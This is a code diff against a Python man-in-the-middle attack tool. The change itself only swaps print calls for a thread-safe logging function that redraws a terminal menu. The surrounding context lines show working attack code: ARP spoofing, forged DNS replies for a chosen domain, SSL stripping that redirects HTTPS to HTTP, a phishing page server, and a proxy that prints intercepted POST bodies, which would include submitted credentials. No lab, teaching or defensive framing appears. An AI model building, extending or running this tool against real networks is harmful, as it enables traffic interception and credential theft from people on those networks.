@@ -138,7 +138,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSQR): # check if packet is for dns
         qname = scapy_packet[scapy.DNSQR].qname
         if website_to_spoof in qname.decode(): # check if domain is the same as the one we want to spoof
-            print(f"[DNS] Spoofing {qname.decode()}")
+            log(f"[DNS] Spoofing {qname.decode()}")
             
             spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                              scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=scapy_packet[scapy.UDP].dport) / \
@@ -217,13 +217,13 @@ def restore(destination_ip, source_ip):
 # arp spoofing thread
 
 def arp_spoof_thread(target_ip, gateway_ip):
-    print(f"[ARP] Spoofing thread started for {target_ip}")
+    log(f"[ARP] Spoofing thread started for {target_ip}")
     
     while cleanup_state['arp_running']:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         time.sleep(ARP_SPOOF_INTERVAL)
-    print(f"\n[ARP] Spoofing thread stopped")
+    log(f"[ARP] Spoofing thread stopped")
 
 def start_arp_spoofing():
     if os.geteuid() != 0:
@@ -305,10 +305,10 @@ def dns_poison_thread():
             time.sleep(DNS_POLL_INTERVAL) 
             
     except Exception as e:
-        print(f"[DNS] Error in DNS thread: {e}")
+        log(f"[DNS] Error in DNS thread: {e}")
     finally:
         cleanup_state['dns_running'] = False
-        print("[DNS] Thread stopped.")
+        log("[DNS] Thread stopped.")
 
 def start_dns_poisoning():
     global website_to_spoof, spoof_ip
@@ -386,7 +386,7 @@ class _RedirectHandler(http.server.BaseHTTPRequestHandler):
         return
 
     def do_GET(self):
-        print(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}{self.path}")
+        log(f"[SSL] Redirecting HTTPS request from {self.client_address[0]} to http://{self.target_host}{self.path}")
         self.send_response(301)
         self.send_header("Location", f"http://{self.target_host}{self.path}")
         self.end_headers()
@@ -403,7 +403,7 @@ class _PhishingHandler(http.server.SimpleHTTPRequestHandler):
         super().__init__(*args, directory=directory, **kwargs)
 
     def log_message(self, format, *args):
-        print(f"[Phishing] {self.client_address[0]} - {args[0] if args else ''}")
+        log(f"[Phishing] {self.client_address[0]} - {args[0] if args else ''}")
 
 
 class _ProxyHandler(http.server.BaseHTTPRequestHandler):
@@ -470,20 +470,20 @@ class _ProxyHandler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(content)
                 
         except Exception as e:
-            print(f"[Proxy] Error fetching https://{connect_host}{self.path}: {e}")
+            log(f"[Proxy] Error fetching https://{connect_host}{self.path}: {e}")
             self.send_response(502)
             self.end_headers()
 
     def do_GET(self):
-        print(f"[Proxy] GET {self.path} from {self.client_address[0]}")
+        log(f"[Proxy] GET {self.path} from {self.client_address[0]}")
         self._proxy_request('GET')
 
     def do_POST(self):
         content_length = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(content_length)
         
-        print(f"[Proxy] POST {self.path} from {self.client_address[0]}")
-        print(f"[Proxy] >>> POST DATA: {body.decode('utf-8', errors='ignore')}")
+        log(f"[Proxy] POST {self.path} from {self.client_address[0]}")
+        log(f"[Proxy] >>> POST DATA: {body.decode('utf-8', errors='ignore')}")
         
         self._proxy_request('POST', body)
 
@@ -539,8 +539,8 @@ def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file
         httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
         cleanup_state['ssl_httpd'] = httpd
         
-        print(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and {mode_desc}")
-        print("[SSL] SSL server running in background. Return to menu.")
+        log(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and {mode_desc}")
+        log("[SSL] SSL server running in background. Return to menu.")
         
         httpd.timeout = HTTP_SERVER_TIMEOUT
         
@@ -549,20 +549,20 @@ def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file
         
         httpd.server_close()
         cleanup_state['ssl_httpd'] = None
-        print("[SSL] Server stopped.")
+        log("[SSL] Server stopped.")
         
     except OSError as exc:
         if exc.errno == errno.EADDRNOTAVAIL:
-            print(f"[SSL] Cannot bind to {bind_ip}. Address not available.")
+            log(f"[SSL] Cannot bind to {bind_ip}. Address not available.")
         elif exc.errno == errno.EACCES:
-            print(f"[SSL] Permission denied binding to port {HTTPS_PORT}. Run with sudo/root.")
+            log(f"[SSL] Permission denied binding to port {HTTPS_PORT}. Run with sudo/root.")
         elif exc.errno == errno.EADDRINUSE:
-            print(f"[SSL] Port {HTTPS_PORT} is already in use.")
+            log(f"[SSL] Port {HTTPS_PORT} is already in use.")
         else:
-            print(f"[SSL] Failed to start HTTPS server: {exc}")
+            log(f"[SSL] Failed to start HTTPS server: {exc}")
         cleanup_state['ssl_strip_running'] = False
     except Exception as e:
-        print(f"[SSL] Error in SSL thread: {e}")
+        log(f"[SSL] Error in SSL thread: {e}")
         cleanup_state['ssl_strip_running'] = False
 
 
@@ -691,11 +691,11 @@ def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = N
         httpd = socketserver.TCPServer((bind_ip, HTTP_PORT), _ProxyHandler)
         cleanup_state['proxy_httpd'] = httpd
         
-        print(f"[Proxy] Listening on {bind_ip}:{HTTP_PORT}")
+        log(f"[Proxy] Listening on {bind_ip}:{HTTP_PORT}")
         if target_ip:
-            print(f"[Proxy] Fetching via IP: {target_ip} (Host: {site_to_spoof})")
+            log(f"[Proxy] Fetching via IP: {target_ip} (Host: {site_to_spoof})")
         else:
-            print(f"[Proxy] Proxying to https://{site_to_spoof}")
+            log(f"[Proxy] Proxying to https://{site_to_spoof}")
         
         httpd.timeout = HTTP_SERVER_TIMEOUT
         
@@ -704,14 +704,14 @@ def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = N
             
     except OSError as exc:
         if exc.errno == errno.EACCES:
-            print(f"[Proxy] Permission denied binding to port {HTTP_PORT}. Run with sudo/root.")
+            log(f"[Proxy] Permission denied binding to port {HTTP_PORT}. Run with sudo/root.")
         elif exc.errno == errno.EADDRINUSE:
-            print(f"[Proxy] Port {HTTP_PORT} is already in use.")
+            log(f"[Proxy] Port {HTTP_PORT} is already in use.")
         else:
-            print(f"[Proxy] Failed to start proxy: {exc}")
+            log(f"[Proxy] Failed to start proxy: {exc}")
         cleanup_state['proxy_running'] = False
     except Exception as e:
-        print(f"[Proxy] Error: {e}")
+        log(f"[Proxy] Error: {e}")
         cleanup_state['proxy_running'] = False
 
 
@@ -744,6 +744,8 @@ def stop_proxy():
     print("[Proxy] Done.")
 
 menu_lines_count = 0
+menu_visible = False
+log_lock = threading.Lock()
 
 # ui part
 
@@ -751,6 +753,15 @@ def clear_menu_lines(num_lines):
     for _ in range(num_lines):
         sys.stdout.write(f'{ANSI_MOVE_UP}\r{ANSI_CLEAR_LINE}')
     sys.stdout.flush()
+
+def log(msg):
+    global menu_visible, menu_lines_count
+    with log_lock:
+        if menu_visible and menu_lines_count > 0:
+            clear_menu_lines(menu_lines_count)
+        print(msg)
+        if menu_visible:
+            print_menu(clear_previous=False)
 
 def print_menu(clear_previous=True):
     global menu_lines_count
@@ -818,9 +829,11 @@ def main():
     """, 'green'))
     
     while True:
-        global menu_lines_count
+        global menu_lines_count, menu_visible
+        menu_visible = True
         print_menu()
         choice = input("> ")
+        menu_visible = False
         clear_menu_lines(menu_lines_count)
         menu_lines_count = 0
         if choice == '1' and not cleanup_state['arp_running']:
